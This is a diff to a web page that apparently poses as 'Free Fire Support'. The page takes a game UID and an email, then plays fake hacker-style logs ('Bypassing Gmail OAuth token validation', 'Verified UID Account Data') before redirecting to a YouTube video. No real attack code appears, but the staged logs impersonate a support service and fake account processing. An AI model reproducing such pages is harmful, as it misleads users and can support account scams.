@@ -333,7 +333,42 @@
         }
 
         /* =========================================
-           2. TELEGRAM-STYLE ROCKET ANIMATION
+           2. BLINKING TRANSITION IMAGE (PROCEED CLICK)
+           ========================================= */
+        .transition-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .transition-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .transition-image {
+            max-width: 15%;
+            max-height: 15%;
+            animation: blinkImage 1s infinite ease-in-out;
+        }
+
+        @keyframes blinkImage {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(0.9); }
+        }
+
+        /* =========================================
+           3. TELEGRAM-STYLE ROCKET ANIMATION
            ========================================= */
         .rocket-overlay {
             position: fixed;
@@ -375,6 +410,7 @@
             .glass-panel { padding: 30px 20px; min-height: 480px; }
             h1 { font-size: 1.8rem; }
             .char { font-size: 2.5rem; }
+            .transition-image { max-width: 25%; max-height: 25%; }
             .telegram-plane { width: 90px; height: 90px; }
         }
     </style>
@@ -383,6 +419,10 @@
 
     <div class="intro-overlay" id="introOverlay">
         <div class="magnetic-container" id="introMagneticText"></div>
+    </div>
+
+    <div class="transition-screen" id="transitionScreen">
+        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image">
     </div>
 
     <div class="rocket-overlay" id="rocketOverlay">
@@ -499,6 +539,7 @@
             const processingSection = document.getElementById('processingSection');
             const processLog = document.getElementById('processLog');
             
+            const transitionScreen = document.getElementById('transitionScreen');
             const rocketOverlay = document.getElementById('rocketOverlay');
             const telegramPlane = document.getElementById('telegramPlane');
 
@@ -686,19 +727,24 @@
             function startSequence(uid, level, email) {
                 const maskedEmail = maskEmail(email);
 
-                // Remove glass borders for completely clean text view
-                glassPanel.classList.add('borderless-mode');
-                
-                formSection.style.display = 'none';
-                processingSection.style.display = 'flex';
+                // 1. Show the Free Fire loading PNG transition
+                transitionScreen.classList.add('active');
 
-                runSeamlessSyncAnimation(uid, level, maskedEmail);
+                // After 1.5 seconds, hide transition, format glass panel and start coding sync
+                setTimeout(() => {
+                    transitionScreen.classList.remove('active');
+                    
+                    glassPanel.classList.add('borderless-mode');
+                    formSection.style.display = 'none';
+                    processingSection.style.display = 'flex';
+
+                    runSeamlessSyncAnimation(uid, level, maskedEmail);
+                }, 1500);
             }
 
             // --- 4. 100% SEAMLESS SYNC ANIMATION (NO CUTS, ONLY GREEN HACKER EFFECT) ---
             function runSeamlessSyncAnimation(uid, level, maskedEmail) {
                 
-                // Strictly Green tech phrases for the 2-second ultra-fast phase without real data
                 const hackerPhrases = [
                     "[SYSTEM] Initiating Free Fire Support protocol v9.4...",
                     "[AUTH] Bypassing Gmail OAuth token validation...",
@@ -714,7 +760,6 @@
                     "[SSL] Handshake successful on port 443..."
                 ];
 
-                // The final normal, slow logs (Directly starts with Main Data)
                 const realLogs = [
                     `<span class="c-system">[System]</span> Establishing secure connection to Support DB...`,
                     `<span class="c-found">[Found]</span> Verified UID Account Data: ${uid}`,
@@ -729,12 +774,11 @@
                 let startTimestamp = null;
                 let reqAnimId;
 
-                // PHASE 1: ULTRA FAST BULLET SPEED (Synced to Refresh Rate)
+                // PHASE 1: ULTRA FAST BULLET SPEED
                 function fastPhase(timestamp) {
                     if (!startTimestamp) startTimestamp = timestamp;
                     let progress = timestamp - startTimestamp;
 
-                    // Append 4 lines instantly per frame for Maximum screen coverage
                     let fragment = document.createDocumentFragment();
                     for(let k=0; k<4; k++) {
                         const lineDiv = document.createElement('div');
@@ -745,34 +789,31 @@
                     }
                     processLog.appendChild(fragment);
                     
-                    // DOM Cleanup to prevent mobile browser freezing/lag
                     while(processLog.childNodes.length > 50) {
                         processLog.removeChild(processLog.firstChild);
                     }
                     
                     processLog.scrollTop = processLog.scrollHeight;
 
-                    if (progress < 2000) { // Exactly 2 seconds
+                    if (progress < 2000) { 
                         reqAnimId = requestAnimationFrame(fastPhase);
                     } else {
-                        // PHASE 2: THE BRAKE (Instant transition to slow motion)
+                        // Brake
                         cancelAnimationFrame(reqAnimId);
                         processLog.style.scrollBehavior = 'smooth';
                         setTimeout(startSlowMotionLogs, 50);
                     }
                 }
                 
-                // Start Fast Phase
                 requestAnimationFrame(fastPhase);
 
-                // PHASE 3: FASTER REAL DATA TYPING (Seamless appending, no breaks)
+                // PHASE 2: REAL DATA TYPING
                 function startSlowMotionLogs() {
                     let realLogIndex = 0;
 
                     function typeNextLine() {
                         if (realLogIndex < realLogs.length) {
                             const lineDiv = document.createElement('div');
-                            // Butter smooth fade in transition
                             lineDiv.className = 'log-entry typing-cursor visible';
                             processLog.appendChild(lineDiv);
 
@@ -781,7 +822,6 @@
                             let isTag = false;
                             let i = 0;
 
-                            // 10ms typing speed (Faster but readable)
                             const typeInterval = setInterval(() => {
                                 if (i < textHTML.length) {
                                     if (textHTML[i] === '<') isTag = true;
@@ -795,12 +835,10 @@
                                     clearInterval(typeInterval);
                                     lineDiv.classList.remove('typing-cursor');
                                     realLogIndex++;
-                                    // 100ms delay between lines for smooth flow
                                     setTimeout(typeNextLine, 100); 
                                 }
                             }, 10); 
                         } else {
-                            // Perfect Sync with Rocket
                             setTimeout(triggerRocketIllusion, 400);
                         }
                     }
@@ -815,11 +853,9 @@
                 setTimeout(() => {
                     telegramPlane.classList.add('fly-in');
                     
-                    // Center pause illusion
                     setTimeout(() => {
                         telegramPlane.classList.add('fly-out');
                         
-                        // Instant redirect perfectly synced with fly-out
                         setTimeout(() => {
                             window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
                         }, 400); 
